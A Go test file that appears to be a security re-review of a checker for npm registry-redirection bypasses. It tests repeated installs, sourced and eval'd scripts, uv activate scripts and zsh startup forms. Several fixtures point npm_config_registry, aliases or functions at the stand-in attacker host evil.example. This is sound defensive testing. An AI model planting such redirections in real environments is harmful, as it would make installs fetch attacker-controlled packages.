//go:build unix

package main

// Independent re-review of ac912da (REPO-POL-NPMRC round 4, ADR-0174 round 9), 2026-11-15: proof tests. A failing
// case is a finding. Bypasses are on the exception path (exceptionPath) and must not be silent; false holds are
// ordinary lines on which nothing moves and must be silent.

import (
	"path/filepath"
	"testing"
)

func TestR4ReviewLaterInstallHidden(t *testing.T) {
	// S1: installPart cuts the line once its prefix has as many targets as the whole line, but ParseLine counts a
	// target once (seen): a second install of the same target after a cd, a variable or an option is cut away, and
	// nothing reads it.
	for _, command := range []string{
		"npm i @acme/cli; cd /srv && npm i @acme/cli",
		"npm i @acme/cli && HOME=/srv npm i @acme/cli",
		"npm i @acme/cli; npm --prefix /srv i @acme/cli",
		"npm i @acme/cli\ncd /srv\nnpm i @acme/cli",
	} {
		exceptionPath(t, command)
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, command, nil); form == "silent" {
			t.Errorf("%q: an exception covers it (stderr %q)", command, stderr)
		}
	}
	// and what runs after the last install still goes ahead
	_, _, cwd := npmWorkspace(t)
	if form, stderr := round7(t, cwd, "npm i @acme/cli && npm test", nil); form != "silent" {
		t.Errorf("npm test after the install: %s (stderr %q)", form, stderr)
	}
}

func TestR4ReviewSourcedScriptIndirection(t *testing.T) {
	// S2: the sourced script is read for its assignments only; what it sources or evaluates in turn is not read, so
	// R2 is open again one level down. A real activate script does neither.
	x := t.TempDir()
	write(t, filepath.Join(x, "env.sh"), "export npm_config_registry=https://evil.example/\n")
	for _, c := range []struct{ name, body string }{
		{"a sourced file", ". " + filepath.Join(x, "env.sh") + "\n"},
		{"an eval of a file", "eval \"$(cat " + filepath.Join(x, "env.sh") + ")\"\n"},
	} {
		v := t.TempDir()
		mkdir(t, filepath.Join(v, "bin"))
		write(t, filepath.Join(v, "bin", "activate"), c.body)
		command := ". " + filepath.Join(v, "bin", "activate") + " && npm i @acme/cli"
		exceptionPath(t, command)
		_, _, cwd := npmWorkspace(t)
		if form, stderr := round7(t, cwd, command, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

func TestR4ReviewUvActivateScript(t *testing.T) {
	// S3: uv's venv (and virtualenv's) activate script sets VIRTUAL_ENV=$(cygpath -u "$VIRTUAL_ENV") in its Cygwin
	// branch (uv 0.13.7, .venv of 1st-city/tools/ml, line 86); the cygpath rule takes only cygpath "<literal path>".
	_, _, cwd := npmWorkspace(t)
	venv := filepath.Join(cwd, ".venv")
	mkdir(t, filepath.Join(venv, "bin"))
	write(t, filepath.Join(venv, "pyvenv.cfg"), "home = /usr/bin\nimplementation = CPython\nuv = 0.13.7\n")
	// round 11 (ADR-0174): a sourced script is accepted only as a known template, so the case writes uv 0.13.7's own
	// (activate/) instead of an excerpt of it
	write(t, filepath.Join(venv, "bin", "activate"), activateFrom(t, "uv-0.13.7", venv, ".venv"))
	command := "source .venv/bin/activate && pip install acme-tools"
	exceptionPath(t, command)
	if form, stderr := round7(t, cwd, command, nil); form != "silent" {
		t.Errorf("uv's activate script: %s, want silent (stderr %q)", form, stderr)
	}
}

func TestR4ReviewStartupForms(t *testing.T) {
	// S4: an assignment by parameter expansion (then exported), a quoted alias, zsh's aliases and functions arrays
	for _, c := range []struct{ name, file, body string }{
		{"${NAME:=value}", ".zshenv", ": ${npm_config_registry:=https://evil.example/}\nexport npm_config_registry\n"},
		{"${NAME=value}", ".zshenv", ": ${npm_config_registry=https://evil.example/}\nexport npm_config_registry\n"},
		{"a quoted alias", ".zshenv", "alias 'npm=npm --registry=https://evil.example/'\n"},
		{"zsh's aliases array", ".zshenv", "aliases[npm]='npm --registry=https://evil.example/'\n"},
		{"zsh's functions array", ".zshenv", "functions[npm]='command npm --registry=https://evil.example/ \"$@\"'\n"},
	} {
		_, _, cwd := npmWorkspace(t)
		home := t.TempDir()
		write(t, filepath.Join(home, c.file), c.body)
		if form, stderr := round7(t, cwd, "npm i @acme/cli", npmrcFiles(t, "", home, nil, nil)); form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}
